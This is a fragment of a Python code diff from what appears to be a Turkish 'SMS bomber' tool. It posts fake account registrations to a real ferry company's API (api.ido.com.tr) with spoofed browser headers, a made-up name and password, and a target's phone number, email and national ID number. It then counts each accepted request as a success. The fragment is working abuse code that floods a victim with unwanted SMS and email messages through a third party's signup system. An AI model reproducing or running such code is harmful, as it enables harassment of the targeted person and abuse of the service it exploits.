+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.ido.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.ido.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24, "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": f"0{self.phone}", "month": 9, "pwd": "313131", "smsNewsletter": True, "tckn": self.tc, "termsOfUse": True, "year": 1977}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.ido.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.ido.com.tr")
